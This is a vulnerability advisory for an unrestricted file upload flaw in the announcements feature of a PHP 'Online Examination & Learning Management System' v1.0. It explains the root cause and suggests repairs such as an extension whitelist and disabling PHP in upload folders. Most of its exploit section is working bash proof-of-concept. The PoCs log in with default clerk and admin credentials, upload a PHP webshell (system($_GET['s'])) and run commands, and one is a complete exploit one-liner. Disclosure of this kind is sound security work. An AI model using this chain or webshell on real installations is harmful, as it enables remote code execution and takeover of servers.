# Online Examination & Learning Management System /announcements.php Unrestricted File Upload → Remote Code Execution

## NAME OF AFFECTED PRODUCT(S)

Online Examination & Learning Management System

### Vendor Homepage

https://www.sourcecodester.com/download-code?nid=18739&title=Onlne+Examination+%26+Learning+Management+System+using+PHP+and+MySQL

## AFFECTED VERSION(S)

### Vulnerable File

`/announcements.php`

### VERSION(S)

v1.0

## PROBLEM TYPE

### Vulnerability Type

Unrestricted File Upload → Remote Code Execution

### Root Cause

The `announcements.php` file allows clerks and super administrators to post announcements with file attachments. The attachment upload at line 20-22 uses `basename()` to prevent path traversal, but performs zero validation on the file extension, MIME type, or file content. The UI label "ATTACH_DOCUMENT (PDF/JPG)" is purely cosmetic — no server-side enforcement exists.

The authorization gate at line 8 restricts POST uploads to `clerk` and `super_admin` roles via `$can_manage = in_array($user_role, ['clerk', 'super_admin'])`.

```php
// announcements.php line 18-22
if (!empty($_FILES['attachment']['name'])) {
    $upload_dir = "uploads/announcements/";
    if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);

    $file_name = time() . '_' . basename($_FILES['attachment']['name']);
    $target_file = $upload_dir . $file_name;

    move_uploaded_file($_FILES['attachment']['tmp_name'], $target_file);
    // ↑ No extension whitelist. No MIME check. basename() only prevents ../ traversal.
```

The Apache configuration serves PHP files from all directories under the web root with `mod_php`. No `.htaccess` exists in `uploads/announcements/`. `AllowOverride` is `None`.

### Impact

An attacker with clerk-level access can upload a PHP webshell and execute commands as `www-data`.

## DESCRIPTION

An unrestricted file upload vulnerability exists in the announcement posting feature. The `/announcements.php` form allows file attachments with no extension validation. The UI suggests "PDF/JPG" but the server performs no corresponding check. A clerk-level account can be leveraged to upload a PHP webshell, achieving remote code execution.

**A clerk account is required. Default clerk credentials exist in the database** (`clerk@example.com`).

## Vulnerability details and POC

### Vulnerability Endpoint

`POST /announcements.php`

### Attack Prerequisites

- A clerk or super_admin session
- Default clerk accounts exist in the database with predictable passwords

### PoC 1: Login + Upload Webshell as Clerk

```bash
# Step 1: Login as clerk, store session cookie
curl -c /tmp/cookie -b /tmp/cookie \
  -X POST "http://TARGET/cictportal/auth_process.php" \
  -d "email=clerk@example.com&password=clerkpass&login_btn=1"

# Step 2: Create webshell payload
echo '<?php system($_GET["s"]); ?>' > /tmp/evil.php

# Step 3: Upload via announcement attachment
curl -b /tmp/cookie \
  -X POST "http://TARGET/cictportal/announcements.php" \
  -F "title=test" \
  -F "content=test" \
  -F "post_announcement=1" \
  -F "attachment=@/tmp/evil.php;filename=evil.php"
```

**Response**: HTTP 200 — page contains "SUCCESS: BROADCAST_DEPLOYED".

### PoC 2: Execute Commands

```bash
curl "http://TARGET/cictportal/uploads/announcements/<timestamp>_evil.php?s=whoami"
# www-data
```

### PoC 3: One-Liner Full Exploit Chain

```bash
curl -c /tmp/c -b /tmp/c -s \
  -X POST "http://TARGET/cictportal/auth_process.php" \
  -d "email=admin@cict.edu&password=admin123&login_btn=1" -o /dev/null && \
echo '<?php system($_GET["s"]); ?>' > /tmp/e.php && \
curl -s -b /tmp/c \
  -X POST "http://TARGET/cictportal/announcements.php" \
  -F "title=x" -F "content=x" -F "post_announcement=1" \
  -F "attachment=@/tmp/e.php;filename=e.php" -o /dev/null -w "Upload: %{http_code}\n" && \
sleep 1 && \
F=$(curl -s -b /tmp/c "http://TARGET/cictportal/announcements.php" | grep -oP '[0-9]+_e\.php' | tail -1) && \
echo "Shell: uploads/announcements/$F" && \
curl -s "http://TARGET/cictportal/uploads/announcements/$F?s=id"
```

## Suggested repair

1. **Add extension whitelist**:

```php
$allowed = ['pdf', 'jpg', 'jpeg', 'png', 'doc', 'docx'];
$ext = strtolower(pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) {
    $message = "ERROR: Invalid file type.";
    // Skip file handling, do not call move_uploaded_file
}
```

2. **Validate MIME type** with `finfo_file()` on the temporary file before `move_uploaded_file()`.

3. **Disable PHP execution in upload directories** — either via `.htaccess` or by moving `uploads/` outside the web root.

4. **Strip the original extension** — store files with a `.bin` extension or a content-hash filename with no extension.

## Reproduction Evidence
